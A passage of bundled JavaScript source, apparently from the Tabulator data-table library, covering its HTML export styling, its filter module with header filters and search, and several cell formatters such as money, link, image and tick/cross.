              value = "";
              break;
          }
        }
        if (value instanceof Node) {
          cellEl.appendChild(value);
        } else {
          cellEl.innerHTML = value;
        }
        styleProps = ["padding-top", "padding-left", "padding-right", "padding-bottom", "border-top", "border-left", "border-right", "border-bottom", "color", "font-weight", "font-family", "font-size", "text-align"];
        if (column.isRowHeader) {
          cellStyle = styles.styleRowHeader;
          styleProps.push("background-color");
        } else {
          cellStyle = styles.styleCells && styles.styleCells[index] ? styles.styleCells[index] : styles.firstCell;
        }
        if (cellStyle) {
          this.mapElementStyles(cellStyle, cellEl, styleProps);
          if (column.definition.align) {
            cellEl.style.textAlign = column.definition.align;
          }
        }
        if (this.table.options.dataTree && this.config.dataTree !== false) {
          if (setup.treeElementField && setup.treeElementField == column.field || !setup.treeElementField && i2 == 0) {
            if (row.component._row.modules.dataTree.controlEl) {
              cellEl.insertBefore(row.component._row.modules.dataTree.controlEl.cloneNode(true), cellEl.firstChild);
            }
            if (row.component._row.modules.dataTree.branchEl) {
              cellEl.insertBefore(row.component._row.modules.dataTree.branchEl.cloneNode(true), cellEl.firstChild);
            }
          }
        }
        rowEl.appendChild(cellEl);
        if (cellWrapper.modules.format && cellWrapper.modules.format.renderedCallback) {
          cellWrapper.modules.format.renderedCallback();
        }
      }
    });
    if (setup.rowFormatter && row.type === "row" && this.config.formatCells !== false) {
      let formatComponent = Object.assign(row.component);
      formatComponent.getElement = function() {
        return rowEl;
      };
      setup.rowFormatter(row.component);
    }
    return rowEl;
  }
  generateHTMLTable(list2) {
    var holder = document.createElement("div");
    holder.appendChild(this.generateTableElement(list2));
    return holder.innerHTML;
  }
  getHtml(visible, style, config, colVisProp) {
    var list2 = this.generateExportList(config || this.table.options.htmlOutputConfig, style, visible, colVisProp || "htmlOutput");
    return this.generateHTMLTable(list2);
  }
  mapElementStyles(from, to, props) {
    if (this.cloneTableStyle && from && to) {
      var lookup2 = {
        "background-color": "backgroundColor",
        "color": "fontColor",
        "width": "width",
        "font-weight": "fontWeight",
        "font-family": "fontFamily",
        "font-size": "fontSize",
        "text-align": "textAlign",
        "border-top": "borderTop",
        "border-left": "borderLeft",
        "border-right": "borderRight",
        "border-bottom": "borderBottom",
        "padding-top": "paddingTop",
        "padding-left": "paddingLeft",
        "padding-right": "paddingRight",
        "padding-bottom": "paddingBottom"
      };
      if (window.getComputedStyle) {
        var fromStyle = window.getComputedStyle(from);
        props.forEach(function(prop) {
          if (!to.style[lookup2[prop]]) {
            to.style[lookup2[prop]] = fromStyle.getPropertyValue(prop);
          }
        });
      }
    }
  }
}
var defaultFilters = {
  //equal to
  "=": function(filterVal, rowVal, rowData, filterParams) {
    return rowVal == filterVal ? true : false;
  },
  //less than
  "<": function(filterVal, rowVal, rowData, filterParams) {
    return rowVal < filterVal ? true : false;
  },
  //less than or equal to
  "<=": function(filterVal, rowVal, rowData, filterParams) {
    return rowVal <= filterVal ? true : false;
  },
  //greater than
  ">": function(filterVal, rowVal, rowData, filterParams) {
    return rowVal > filterVal ? true : false;
  },
  //greater than or equal to
  ">=": function(filterVal, rowVal, rowData, filterParams) {
    return rowVal >= filterVal ? true : false;
  },
  //not equal to
  "!=": function(filterVal, rowVal, rowData, filterParams) {
    return rowVal != filterVal ? true : false;
  },
  "regex": function(filterVal, rowVal, rowData, filterParams) {
    if (typeof filterVal == "string") {
      filterVal = new RegExp(filterVal);
    }
    return filterVal.test(rowVal);
  },
  //contains the string
  "like": function(filterVal, rowVal, rowData, filterParams) {
    if (filterVal === null || typeof filterVal === "undefined") {
      return rowVal === filterVal ? true : false;
    } else {
      if (typeof rowVal !== "undefined" && rowVal !== null) {
        return String(rowVal).toLowerCase().indexOf(filterVal.toLowerCase()) > -1;
      } else {
        return false;
      }
    }
  },
  //contains the keywords
  "keywords": function(filterVal, rowVal, rowData, filterParams) {
    var keywords = filterVal.toLowerCase().split(typeof filterParams.separator === "undefined" ? " " : filterParams.separator), value = String(rowVal === null || typeof rowVal === "undefined" ? "" : rowVal).toLowerCase(), matches = [];
    keywords.forEach((keyword) => {
      if (value.includes(keyword)) {
        matches.push(true);
      }
    });
    return filterParams.matchAll ? matches.length === keywords.length : !!matches.length;
  },
  //starts with the string
  "starts": function(filterVal, rowVal, rowData, filterParams) {
    if (filterVal === null || typeof filterVal === "undefined") {
      return rowVal === filterVal ? true : false;
    } else {
      if (typeof rowVal !== "undefined" && rowVal !== null) {
        return String(rowVal).toLowerCase().startsWith(filterVal.toLowerCase());
      } else {
        return false;
      }
    }
  },
  //ends with the string
  "ends": function(filterVal, rowVal, rowData, filterParams) {
    if (filterVal === null || typeof filterVal === "undefined") {
      return rowVal === filterVal ? true : false;
    } else {
      if (typeof rowVal !== "undefined" && rowVal !== null) {
        return String(rowVal).toLowerCase().endsWith(filterVal.toLowerCase());
      } else {
        return false;
      }
    }
  },
  //in array
  "in": function(filterVal, rowVal, rowData, filterParams) {
    if (Array.isArray(filterVal)) {
      return filterVal.length ? filterVal.indexOf(rowVal) > -1 : true;
    } else {
      console.warn("Filter Error - filter value is not an array:", filterVal);
      return false;
    }
  }
};
class Filter extends Module {
  static moduleName = "filter";
  //load defaults
  static filters = defaultFilters;
  constructor(table) {
    super(table);
    this.filterList = [];
    this.headerFilters = {};
    this.headerFilterColumns = [];
    this.prevHeaderFilterChangeCheck = "";
    this.prevHeaderFilterChangeCheck = "{}";
    this.changed = false;
    this.tableInitialized = false;
    this.registerTableOption("filterMode", "local");
    this.registerTableOption("initialFilter", false);
    this.registerTableOption("initialHeaderFilter", false);
    this.registerTableOption("headerFilterLiveFilterDelay", 300);
    this.registerTableOption("placeholderHeaderFilter", false);
    this.registerColumnOption("headerFilter");
    this.registerColumnOption("headerFilterPlaceholder");
    this.registerColumnOption("headerFilterParams");
    this.registerColumnOption("headerFilterEmptyCheck");
    this.registerColumnOption("headerFilterFunc");
    this.registerColumnOption("headerFilterFuncParams");
    this.registerColumnOption("headerFilterLiveFilter");
    this.registerTableFunction("searchRows", this.searchRows.bind(this));
    this.registerTableFunction("searchData", this.searchData.bind(this));
    this.registerTableFunction("setFilter", this.userSetFilter.bind(this));
    this.registerTableFunction("refreshFilter", this.userRefreshFilter.bind(this));
    this.registerTableFunction("addFilter", this.userAddFilter.bind(this));
    this.registerTableFunction("getFilters", this.getFilters.bind(this));
    this.registerTableFunction("setHeaderFilterFocus", this.userSetHeaderFilterFocus.bind(this));
    this.registerTableFunction("getHeaderFilterValue", this.userGetHeaderFilterValue.bind(this));
    this.registerTableFunction("setHeaderFilterValue", this.userSetHeaderFilterValue.bind(this));
    this.registerTableFunction("getHeaderFilters", this.getHeaderFilters.bind(this));
    this.registerTableFunction("removeFilter", this.userRemoveFilter.bind(this));
    this.registerTableFunction("clearFilter", this.userClearFilter.bind(this));
    this.registerTableFunction("clearHeaderFilter", this.userClearHeaderFilter.bind(this));
    this.registerComponentFunction("column", "headerFilterFocus", this.setHeaderFilterFocus.bind(this));
    this.registerComponentFunction("column", "reloadHeaderFilter", this.reloadHeaderFilter.bind(this));
    this.registerComponentFunction("column", "getHeaderFilterValue", this.getHeaderFilterValue.bind(this));
    this.registerComponentFunction("column", "setHeaderFilterValue", this.setHeaderFilterValue.bind(this));
  }
  initialize() {
    this.subscribe("column-init", this.initializeColumnHeaderFilter.bind(this));
    this.subscribe("column-width-fit-before", this.hideHeaderFilterElements.bind(this));
    this.subscribe("column-width-fit-after", this.showHeaderFilterElements.bind(this));
    this.subscribe("table-built", this.tableBuilt.bind(this));
    this.subscribe("placeholder", this.generatePlaceholder.bind(this));
    if (this.table.options.filterMode === "remote") {
      this.subscribe("data-params", this.remoteFilterParams.bind(this));
    }
    this.registerDataHandler(this.filter.bind(this), 10);
  }
  tableBuilt() {
    if (this.table.options.initialFilter) {
      this.setFilter(this.table.options.initialFilter);
    }
    if (this.table.options.initialHeaderFilter) {
      this.table.options.initialHeaderFilter.forEach((item) => {
        var column = this.table.columnManager.findColumn(item.field);
        if (column) {
          this.setHeaderFilterValue(column, item.value);
        } else {
          console.warn("Column Filter Error - No matching column found:", item.field);
          return false;
        }
      });
    }
    this.tableInitialized = true;
  }
  remoteFilterParams(data, config, silent, params) {
    params.filter = this.getFilters(true, true);
    return params;
  }
  generatePlaceholder(text) {
    if (this.table.options.placeholderHeaderFilter && Object.keys(this.headerFilters).length) {
      return this.table.options.placeholderHeaderFilter;
    }
  }
  ///////////////////////////////////
  ///////// Table Functions /////////
  ///////////////////////////////////
  //set standard filters
  userSetFilter(field, type, value, params) {
    this.setFilter(field, type, value, params);
    this.refreshFilter();
  }
  //set standard filters
  userRefreshFilter() {
    this.refreshFilter();
  }
  //add filter to array
  userAddFilter(field, type, value, params) {
    this.addFilter(field, type, value, params);
    this.refreshFilter();
  }
  userSetHeaderFilterFocus(field) {
    var column = this.table.columnManager.findColumn(field);
    if (column) {
      this.setHeaderFilterFocus(column);
    } else {
      console.warn("Column Filter Focus Error - No matching column found:", field);
      return false;
    }
  }
  userGetHeaderFilterValue(field) {
    var column = this.table.columnManager.findColumn(field);
    if (column) {
      return this.getHeaderFilterValue(column);
    } else {
      console.warn("Column Filter Error - No matching column found:", field);
    }
  }
  userSetHeaderFilterValue(field, value) {
    var column = this.table.columnManager.findColumn(field);
    if (column) {
      this.setHeaderFilterValue(column, value);
    } else {
      console.warn("Column Filter Error - No matching column found:", field);
      return false;
    }
  }
  //remove filter from array
  userRemoveFilter(field, type, value) {
    this.removeFilter(field, type, value);
    this.refreshFilter();
  }
  //clear filters
  userClearFilter(all) {
    this.clearFilter(all);
    this.refreshFilter();
  }
  //clear header filters
  userClearHeaderFilter() {
    this.clearHeaderFilter();
    this.refreshFilter();
  }
  //search for specific row components
  searchRows(field, type, value) {
    return this.search("rows", field, type, value);
  }
  //search for specific data
  searchData(field, type, value) {
    return this.search("data", field, type, value);
  }
  ///////////////////////////////////
  ///////// Internal Logic //////////
  ///////////////////////////////////
  initializeColumnHeaderFilter(column) {
    var def = column.definition;
    if (def.headerFilter) {
      this.initializeColumn(column);
    }
  }
  //initialize column header filter
  initializeColumn(column, value) {
    var self = this, field = column.getField();
    function success(value2) {
      var filterType = column.modules.filter.tagType == "input" && column.modules.filter.attrType == "text" || column.modules.filter.tagType == "textarea" ? "partial" : "match", type = "", filterChangeCheck = "", filterFunc;
      if (typeof column.modules.filter.prevSuccess === "undefined" || column.modules.filter.prevSuccess !== value2) {
        column.modules.filter.prevSuccess = value2;
        if (!column.modules.filter.emptyFunc(value2)) {
          column.modules.filter.value = value2;
          switch (typeof column.definition.headerFilterFunc) {
            case "string":
              if (Filter.filters[column.definition.headerFilterFunc]) {
                type = column.definition.headerFilterFunc;
                filterFunc = function(data) {
                  var params = column.definition.headerFilterFuncParams || {};
                  var fieldVal = column.getFieldValue(data);
                  params = typeof params === "function" ? params(value2, fieldVal, data) : params;
                  return Filter.filters[column.definition.headerFilterFunc](value2, fieldVal, data, params);
                };
              } else {
                console.warn("Header Filter Error - Matching filter function not found: ", column.definition.headerFilterFunc);
              }
              break;
            case "function":
              filterFunc = function(data) {
                var params = column.definition.headerFilterFuncParams || {};
                var fieldVal = column.getFieldValue(data);
                params = typeof params === "function" ? params(value2, fieldVal, data) : params;
                return column.definition.headerFilterFunc(value2, fieldVal, data, params);
              };
              type = filterFunc;
              break;
          }
          if (!filterFunc) {
            switch (filterType) {
              case "partial":
                filterFunc = function(data) {
                  var colVal = column.getFieldValue(data);
                  if (typeof colVal !== "undefined" && colVal !== null) {
                    return String(colVal).toLowerCase().indexOf(String(value2).toLowerCase()) > -1;
                  } else {
                    return false;
                  }
                };
                type = "like";
                break;
              default:
                filterFunc = function(data) {
                  return column.getFieldValue(data) == value2;
                };
                type = "=";
            }
          }
          self.headerFilters[field] = { value: value2, func: filterFunc, type };
        } else {
          delete self.headerFilters[field];
        }
        column.modules.filter.value = value2;
        filterChangeCheck = JSON.stringify(self.headerFilters);
        if (self.prevHeaderFilterChangeCheck !== filterChangeCheck) {
          self.prevHeaderFilterChangeCheck = filterChangeCheck;
          self.trackChanges();
          self.refreshFilter();
        }
      }
      return true;
    }
    column.modules.filter = {
      success,
      attrType: false,
      tagType: false,
      emptyFunc: false
    };
    this.generateHeaderFilterElement(column);
  }
  generateHeaderFilterElement(column, initialValue, reinitialize) {
    var self = this, success = column.modules.filter.success, field = column.getField(), filterElement, editor, editorElement, cellWrapper, typingTimer, searchTrigger, params, onRenderedCallback;
    column.modules.filter.value = initialValue;
    function cancel2() {
    }
    function onRendered(callback) {
      onRenderedCallback = callback;
    }
    if (column.modules.filter.headerElement && column.modules.filter.headerElement.parentNode) {
      column.contentElement.removeChild(column.modules.filter.headerElement.parentNode);
    }
    if (field) {
      column.modules.filter.emptyFunc = column.definition.headerFilterEmptyCheck || function(value) {
        return !value && value !== 0;
      };
      filterElement = document.createElement("div");
      filterElement.classList.add("tabulator-header-filter");
      switch (typeof column.definition.headerFilter) {
        case "string":
          if (self.table.modules.edit.editors[column.definition.headerFilter]) {
            editor = self.table.modules.edit.editors[column.definition.headerFilter];
            if ((column.definition.headerFilter === "tick" || column.definition.headerFilter === "tickCross") && !column.definition.headerFilterEmptyCheck) {
              column.modules.filter.emptyFunc = function(value) {
                return value !== true && value !== false;
              };
            }
          } else {
            console.warn("Filter Error - Cannot build header filter, No such editor found: ", column.definition.editor);
          }
          break;
        case "function":
          editor = column.definition.headerFilter;
          break;
        case "boolean":
          if (column.modules.edit && column.modules.edit.editor) {
            editor = column.modules.edit.editor;
          } else {
            if (column.definition.formatter && self.table.modules.edit.editors[column.definition.formatter]) {
              editor = self.table.modules.edit.editors[column.definition.formatter];
              if ((column.definition.formatter === "tick" || column.definition.formatter === "tickCross") && !column.definition.headerFilterEmptyCheck) {
                column.modules.filter.emptyFunc = function(value) {
                  return value !== true && value !== false;
                };
              }
            } else {
              editor = self.table.modules.edit.editors["input"];
            }
          }
          break;
      }
      if (editor) {
        cellWrapper = {
          getValue: function() {
            return typeof initialValue !== "undefined" ? initialValue : "";
          },
          getField: function() {
            return column.definition.field;
          },
          getElement: function() {
            return filterElement;
          },
          getColumn: function() {
            return column.getComponent();
          },
          getTable: () => {
            return this.table;
          },
          getType: () => {
            return "header";
          },
          getRow: function() {
            return {
              normalizeHeight: function() {
              }
            };
          }
        };
        params = column.definition.headerFilterParams || {};
        params = typeof params === "function" ? params.call(self.table, cellWrapper) : params;
        editorElement = editor.call(this.table.modules.edit, cellWrapper, onRendered, success, cancel2, params);
        if (!editorElement) {
          console.warn("Filter Error - Cannot add filter to " + field + " column, editor returned a value of false");
          return;
        }
        if (!(editorElement instanceof Node)) {
          console.warn("Filter Error - Cannot add filter to " + field + " column, editor should return an instance of Node, the editor returned:", editorElement);
          return;
        }
        self.langBind("headerFilters|columns|" + column.definition.field, function(value) {
          editorElement.setAttribute("placeholder", typeof value !== "undefined" && value ? value : column.definition.headerFilterPlaceholder || self.langText("headerFilters|default"));
        });
        editorElement.addEventListener("click", function(e2) {
          e2.stopPropagation();
          editorElement.focus();
        });
        editorElement.addEventListener("focus", (e2) => {
          var left2 = this.table.columnManager.contentsElement.scrollLeft;
          var headerPos = this.table.rowManager.element.scrollLeft;
          if (left2 !== headerPos) {
            this.table.rowManager.scrollHorizontal(left2);
            this.table.columnManager.scrollHorizontal(left2);
          }
        });
        typingTimer = false;
        searchTrigger = function(e2) {
          if (typingTimer) {
            clearTimeout(typingTimer);
          }
          typingTimer = setTimeout(function() {
            success(editorElement.value);
          }, self.table.options.headerFilterLiveFilterDelay);
        };
        column.modules.filter.headerElement = editorElement;
        column.modules.filter.attrType = editorElement.hasAttribute("type") ? editorElement.getAttribute("type").toLowerCase() : "";
        column.modules.filter.tagType = editorElement.tagName.toLowerCase();
        if (column.definition.headerFilterLiveFilter !== false) {
          if (!(column.definition.headerFilter === "autocomplete" || column.definition.headerFilter === "tickCross" || (column.definition.editor === "autocomplete" || column.definition.editor === "tickCross") && column.definition.headerFilter === true)) {
            editorElement.addEventListener("keyup", searchTrigger);
            editorElement.addEventListener("search", searchTrigger);
            if (column.modules.filter.attrType == "number") {
              editorElement.addEventListener("change", function(e2) {
                success(editorElement.value);
              });
            }
            if (column.modules.filter.attrType == "text" && this.table.browser !== "ie") {
              editorElement.setAttribute("type", "search");
            }
          }
          if (column.modules.filter.tagType == "input" || column.modules.filter.tagType == "select" || column.modules.filter.tagType == "textarea") {
            editorElement.addEventListener("mousedown", function(e2) {
              e2.stopPropagation();
            });
          }
        }
        filterElement.appendChild(editorElement);
        column.contentElement.appendChild(filterElement);
        if (!reinitialize) {
          self.headerFilterColumns.push(column);
        }
        if (onRenderedCallback) {
          onRenderedCallback();
        }
      }
    } else {
      console.warn("Filter Error - Cannot add header filter, column has no field set:", column.definition.title);
    }
  }
  //hide all header filter elements (used to ensure correct column widths in "fitData" layout mode)
  hideHeaderFilterElements() {
    this.headerFilterColumns.forEach(function(column) {
      if (column.modules.filter && column.modules.filter.headerElement) {
        column.modules.filter.headerElement.style.display = "none";
      }
    });
  }
  //show all header filter elements (used to ensure correct column widths in "fitData" layout mode)
  showHeaderFilterElements() {
    this.headerFilterColumns.forEach(function(column) {
      if (column.modules.filter && column.modules.filter.headerElement) {
        column.modules.filter.headerElement.style.display = "";
      }
    });
  }
  //programmatically set focus of header filter
  setHeaderFilterFocus(column) {
    if (column.modules.filter && column.modules.filter.headerElement) {
      column.modules.filter.headerElement.focus();
    } else {
      console.warn("Column Filter Focus Error - No header filter set on column:", column.getField());
    }
  }
  //programmatically get value of header filter
  getHeaderFilterValue(column) {
    if (column.modules.filter && column.modules.filter.headerElement) {
      return column.modules.filter.value;
    } else {
      console.warn("Column Filter Error - No header filter set on column:", column.getField());
    }
  }
  //programmatically set value of header filter
  setHeaderFilterValue(column, value) {
    if (column) {
      if (column.modules.filter && column.modules.filter.headerElement) {
        this.generateHeaderFilterElement(column, value, true);
        column.modules.filter.success(value);
      } else {
        console.warn("Column Filter Error - No header filter set on column:", column.getField());
      }
    }
  }
  reloadHeaderFilter(column) {
    if (column) {
      if (column.modules.filter && column.modules.filter.headerElement) {
        this.generateHeaderFilterElement(column, column.modules.filter.value, true);
      } else {
        console.warn("Column Filter Error - No header filter set on column:", column.getField());
      }
    }
  }
  refreshFilter() {
    if (this.tableInitialized) {
      if (this.table.options.filterMode === "remote") {
        this.reloadData(null, false, false);
      } else {
        this.refreshData(true);
      }
    }
  }
  //check if the filters has changed since last use
  trackChanges() {
    this.changed = true;
    this.dispatch("filter-changed");
  }
  //check if the filters has changed since last use
  hasChanged() {
    var changed = this.changed;
    this.changed = false;
    return changed;
  }
  //set standard filters
  setFilter(field, type, value, params) {
    this.filterList = [];
    if (!Array.isArray(field)) {
      field = [{ field, type, value, params }];
    }
    this.addFilter(field);
  }
  //add filter to array
  addFilter(field, type, value, params) {
    var changed = false;
    if (!Array.isArray(field)) {
      field = [{ field, type, value, params }];
    }
    field.forEach((filter2) => {
      filter2 = this.findFilter(filter2);
      if (filter2) {
        this.filterList.push(filter2);
        changed = true;
      }
    });
    if (changed) {
      this.trackChanges();
    }
  }
  findFilter(filter2) {
    var column;
    if (Array.isArray(filter2)) {
      return this.findSubFilters(filter2);
    }
    var filterFunc = false;
    if (typeof filter2.field == "function") {
      filterFunc = function(data) {
        return filter2.field(data, filter2.type || {});
      };
    } else {
      if (Filter.filters[filter2.type]) {
        column = this.table.columnManager.getColumnByField(filter2.field);
        if (column) {
          filterFunc = function(data) {
            return Filter.filters[filter2.type](filter2.value, column.getFieldValue(data), data, filter2.params || {});
          };
        } else {
          filterFunc = function(data) {
            return Filter.filters[filter2.type](filter2.value, data[filter2.field], data, filter2.params || {});
          };
        }
      } else {
        console.warn("Filter Error - No such filter type found, ignoring: ", filter2.type);
      }
    }
    filter2.func = filterFunc;
    return filter2.func ? filter2 : false;
  }
  findSubFilters(filters) {
    var output = [];
    filters.forEach((filter2) => {
      filter2 = this.findFilter(filter2);
      if (filter2) {
        output.push(filter2);
      }
    });
    return output.length ? output : false;
  }
  //get all filters
  getFilters(all, ajax) {
    var output = [];
    if (all) {
      output = this.getHeaderFilters();
    }
    if (ajax) {
      output.forEach(function(item) {
        if (typeof item.type == "function") {
          item.type = "function";
        }
      });
    }
    output = output.concat(this.filtersToArray(this.filterList, ajax));
    return output;
  }
  //filter to Object
  filtersToArray(filterList, ajax) {
    var output = [];
    filterList.forEach((filter2) => {
      var item;
      if (Array.isArray(filter2)) {
        output.push(this.filtersToArray(filter2, ajax));
      } else {
        item = { field: filter2.field, type: filter2.type, value: filter2.value };
        if (ajax) {
          if (typeof item.type == "function") {
            item.type = "function";
          }
        }
        output.push(item);
      }
    });
    return output;
  }
  //get all filters
  getHeaderFilters() {
    var output = [];
    for (var key in this.headerFilters) {
      output.push({ field: key, type: this.headerFilters[key].type, value: this.headerFilters[key].value });
    }
    return output;
  }
  //remove filter from array
  removeFilter(field, type, value) {
    if (!Array.isArray(field)) {
      field = [{ field, type, value }];
    }
    field.forEach((filter2) => {
      var index = -1;
      if (typeof filter2.field == "object") {
        index = this.filterList.findIndex((element) => {
          return filter2 === element;
        });
      } else {
        index = this.filterList.findIndex((element) => {
          return filter2.field === element.field && filter2.type === element.type && filter2.value === element.value;
        });
      }
      if (index > -1) {
        this.filterList.splice(index, 1);
      } else {
        console.warn("Filter Error - No matching filter type found, ignoring: ", filter2.type);
      }
    });
    this.trackChanges();
  }
  //clear filters
  clearFilter(all) {
    this.filterList = [];
    if (all) {
      this.clearHeaderFilter();
    }
    this.trackChanges();
  }
  //clear header filters
  clearHeaderFilter() {
    this.headerFilters = {};
    this.prevHeaderFilterChangeCheck = "{}";
    this.headerFilterColumns.forEach((column) => {
      if (typeof column.modules.filter.value !== "undefined") {
        delete column.modules.filter.value;
      }
      column.modules.filter.prevSuccess = void 0;
      this.reloadHeaderFilter(column);
    });
    this.trackChanges();
  }
  //search data and return matching rows
  search(searchType, field, type, value) {
    var activeRows = [], filterList = [];
    if (!Array.isArray(field)) {
      field = [{ field, type, value }];
    }
    field.forEach((filter2) => {
      filter2 = this.findFilter(filter2);
      if (filter2) {
        filterList.push(filter2);
      }
    });
    this.table.rowManager.rows.forEach((row) => {
      var match2 = true;
      filterList.forEach((filter2) => {
        if (!this.filterRecurse(filter2, row.getData())) {
          match2 = false;
        }
      });
      if (match2) {
        activeRows.push(searchType === "data" ? row.getData("data") : row.getComponent());
      }
    });
    return activeRows;
  }
  //filter row array
  filter(rowList, filters) {
    var activeRows = [], activeRowComponents = [];
    if (this.subscribedExternal("dataFiltering")) {
      this.dispatchExternal("dataFiltering", this.getFilters(true));
    }
    if (this.table.options.filterMode !== "remote" && (this.filterList.length || Object.keys(this.headerFilters).length)) {
      rowList.forEach((row) => {
        if (this.filterRow(row)) {
          activeRows.push(row);
        }
      });
    } else {
      activeRows = rowList.slice(0);
    }
    if (this.subscribedExternal("dataFiltered")) {
      activeRows.forEach((row) => {
        activeRowComponents.push(row.getComponent());
      });
      this.dispatchExternal("dataFiltered", this.getFilters(true), activeRowComponents);
    }
    return activeRows;
  }
  //filter individual row
  filterRow(row, filters) {
    var match2 = true, data = row.getData();
    this.filterList.forEach((filter2) => {
      if (!this.filterRecurse(filter2, data)) {
        match2 = false;
      }
    });
    for (var field in this.headerFilters) {
      if (!this.headerFilters[field].func(data)) {
        match2 = false;
      }
    }
    return match2;
  }
  filterRecurse(filter2, data) {
    var match2 = false;
    if (Array.isArray(filter2)) {
      filter2.forEach((subFilter) => {
        if (this.filterRecurse(subFilter, data)) {
          match2 = true;
        }
      });
    } else {
      match2 = filter2.func(data);
    }
    return match2;
  }
}
function plaintext(cell, formatterParams, onRendered) {
  return this.emptyToSpace(this.sanitizeHTML(cell.getValue()));
}
function html(cell, formatterParams, onRendered) {
  return cell.getValue();
}
function textarea(cell, formatterParams, onRendered) {
  cell.getElement().style.whiteSpace = "pre-wrap";
  return this.emptyToSpace(this.sanitizeHTML(cell.getValue()));
}
function money(cell, formatterParams, onRendered) {
  var floatVal = parseFloat(cell.getValue()), sign = "", number2, integer, decimal, rgx, value;
  var decimalSym = formatterParams.decimal || ".";
  var thousandSym = formatterParams.thousand || ",";
  var negativeSign = formatterParams.negativeSign || "-";
  var symbol = formatterParams.symbol || "";
  var after = !!formatterParams.symbolAfter;
  var precision = typeof formatterParams.precision !== "undefined" ? formatterParams.precision : 2;
  if (isNaN(floatVal)) {
    return this.emptyToSpace(this.sanitizeHTML(cell.getValue()));
  }
  if (floatVal < 0) {
    floatVal = Math.abs(floatVal);
    sign = negativeSign;
  }
  number2 = precision !== false ? floatVal.toFixed(precision) : floatVal;
  number2 = String(number2).split(".");
  integer = number2[0];
  decimal = number2.length > 1 ? decimalSym + number2[1] : "";
  if (formatterParams.thousand !== false) {
    rgx = /(\d+)(\d{3})/;
    while (rgx.test(integer)) {
      integer = integer.replace(rgx, "$1" + thousandSym + "$2");
    }
  }
  value = integer + decimal;
  if (sign === true) {
    value = "(" + value + ")";
    return after ? value + symbol : symbol + value;
  } else {
    return after ? sign + value + symbol : sign + symbol + value;
  }
}
function link(cell, formatterParams, onRendered) {
  var value = cell.getValue(), urlPrefix = formatterParams.urlPrefix || "", download = formatterParams.download, label = value, el = document.createElement("a"), data;
  function labelTraverse(path, data2) {
    var item = path.shift(), value2 = data2[item];
    if (path.length && typeof value2 === "object") {
      return labelTraverse(path, value2);
    }
    return value2;
  }
  if (formatterParams.labelField) {
    data = cell.getData();
    label = labelTraverse(formatterParams.labelField.split(this.table.options.nestedFieldSeparator), data);
  }
  if (formatterParams.label) {
    switch (typeof formatterParams.label) {
      case "string":
        label = formatterParams.label;
        break;
      case "function":
        label = formatterParams.label(cell);
        break;
    }
  }
  if (label) {
    if (formatterParams.urlField) {
      data = cell.getData();
      value = Helpers.retrieveNestedData(this.table.options.nestedFieldSeparator, formatterParams.urlField, data);
    }
    if (formatterParams.url) {
      switch (typeof formatterParams.url) {
        case "string":
          value = formatterParams.url;
          break;
        case "function":
          value = formatterParams.url(cell);
          break;
      }
    }
    el.setAttribute("href", urlPrefix + value);
    if (formatterParams.target) {
      el.setAttribute("target", formatterParams.target);
    }
    if (formatterParams.download) {
      if (typeof download == "function") {
        download = download(cell);
      } else {
        download = download === true ? "" : download;
      }
      el.setAttribute("download", download);
    }
    el.innerHTML = this.emptyToSpace(this.sanitizeHTML(label));
    return el;
  } else {
    return "&nbsp;";
  }
}
function image(cell, formatterParams, onRendered) {
  var el = document.createElement("img"), src = cell.getValue();
  if (formatterParams.urlPrefix) {
    src = formatterParams.urlPrefix + cell.getValue();
  }
  if (formatterParams.urlSuffix) {
    src = src + formatterParams.urlSuffix;
  }
  el.setAttribute("src", src);
  switch (typeof formatterParams.height) {
    case "number":
      el.style.height = formatterParams.height + "px";
      break;
    case "string":
      el.style.height = formatterParams.height;
      break;
  }
  switch (typeof formatterParams.width) {
    case "number":
      el.style.width = formatterParams.width + "px";
      break;
    case "string":
      el.style.width = formatterParams.width;
      break;
  }
  el.addEventListener("load", function() {
    cell.getRow().normalizeHeight();
  });
  return el;
}
function tickCross(cell, formatterParams, onRendered) {
  var value = cell.getValue(), element = cell.getElement(), empty = formatterParams.allowEmpty, truthy = formatterParams.allowTruthy, trueValueSet = Object.keys(formatterParams).includes("trueValue"), tick = typeof formatterParams.tickElement !== "undefined" ? formatterParams.tickElement : '<svg enable-background="new 0 0 24 24" height="14" width="14" viewBox="0 0 24 24" xml:space="preserve" ><path fill="#2DC214" clip-rule="evenodd" d="M21.652,3.211c-0.293-0.295-0.77-0.295-1.061,0L9.41,14.34  c-0.293,0.297-0.771,0.297-1.062,0L3.449,9.351C3.304,9.203,3.114,9.13,2.923,9.129C2.73,9.128,2.534,9.201,2.387,9.351  l-2.165,1.946C0.078,11.445,0,11.63,0,11.823c0,0.194,0.078,0.397,0.223,0.544l4.94,5.184c0.292,0.296,0.771,0.776,1.062,1.07  l2.124,2.141c0.292,0.293,0.769,0.293,1.062,0l14.366-14.34c0.293-0.294,0.293-0.777,0-1.071L21.652,3.211z" fill-rule="evenodd"/></svg>', cross = typeof formatterParams.crossElement !== "undefined" ? formatterParams.crossElement : '<svg enable-background="new 0 0 24 24" height="14" width="14"  viewBox="0 0 24 24" xml:space="preserve" ><path fill="#CE1515" d="M22.245,4.015c0.313,0.313,0.313,0.826,0,1.139l-6.276,6.27c-0.313,0.312-0.313,0.826,0,1.14l6.273,6.272  c0.313,0.313,0.313,0.826,0,1.14l-2.285,2.277c-0.314,0.312-0.828,0.312-1.142,0l-6.271-6.271c-0.313-0.313-0.828-0.313-1.141,0  l-6.276,6.267c-0.313,0.313-0.828,0.313-1.141,0l-2.282-2.28c-0.313-0.313-0.313-0.826,0-1.14l6.278-6.269  c0.313-0.312,0.313-0.826,0-1.14L1.709,5.147c-0.314-0.313-0.314-0.827,0-1.14l2.284-2.278C4.308,1.417,4.821,1.417,5.135,1.73  L11.405,8c0.314,0.314,0.828,0.314,1.141,0.001l6.276-6.267c0.312-0.312,0.826-0.312,1.141,0L22.245,4.015z"/></svg>';
  if (trueValueSet && value === formatterParams.trueValue || !trueValueSet && (truthy && value || (value === true || value === "true" || value === "True" || value === 1 || value === "1"))) {
    element.setAttribute("aria-checked", true);
    return tick || "";
  } else {
    if (empty && (value === "null" || value === "" || value === null || typeof value === "undefined")) {
      element.setAttribute("aria-checked", "mixed");
      return "";
    } else {
      element.setAttribute("aria-checked", false);
      return cross || "";
    }
  }
}
function datetime$1(cell, formatterParams, onRendered) {
  var DT = this.table.dependencyRegistry.lookup(["luxon", "DateTime"], "DateTime");
  var inputFormat = formatterParams.inputFormat || "yyyy-MM-dd HH:mm:ss";
  var outputFormat = formatterParams.outputFormat || "dd/MM/yyyy HH:mm:ss";
